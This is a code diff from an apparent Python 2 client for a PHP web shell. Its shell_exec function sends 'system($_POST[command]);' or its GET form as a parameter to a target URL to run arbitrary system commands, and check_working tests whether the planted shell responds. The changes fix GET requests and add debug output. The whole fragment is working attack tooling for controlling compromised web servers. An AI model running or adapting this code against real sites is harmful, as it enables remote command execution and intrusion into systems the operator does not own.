@@ -36,11 +36,13 @@ def init(url, method, auth):
 def shell_exec(url, method, auth, command):
     # system, exec, shell_exec, popen, proc_open, passthru
     if method == "POST":
+        print "[POST]"
         data = {auth:"system($_POST[command]);",  "command":command}
         response = requests.post(url, data=data)
     elif method == "GET":
-        data = {auth:"system($_GET[command]);", "command":command}
-        response = requests.get(url, data=data)
+        print "[GET]"
+        params = {auth:"system($_GET[command]);", "command":command}
+        response = requests.get(url, params=params)
     else:
         return (False, "Unsupported method!")
     content = response.text
@@ -73,9 +75,17 @@ def check_working(url, method, auth):
     value = random_string(32, string.letters)
     print "[+] Using key : [%s]" % (key)
     print "[+] Using value : [%s]" % (value)
-    data = {auth:"echo $_POST[%s];" % (key), key:value}
-    response = requests.post(url, data=data)
+    if method == "POST":
+        data = {auth:'var_dump("$_POST[%s]");' % (key), key:value}
+        response = requests.post(url, data=data)
+    elif method == "GET":
+        params = {auth:'var_dump("$_GET[%s]");' % (key), key:value}
+        response = requests.get(url, params=params)
+    else:
+        return "Not supported method!"
     content = response.content
+    print content
+    print response.status_code
     return value in content
 
 def main():
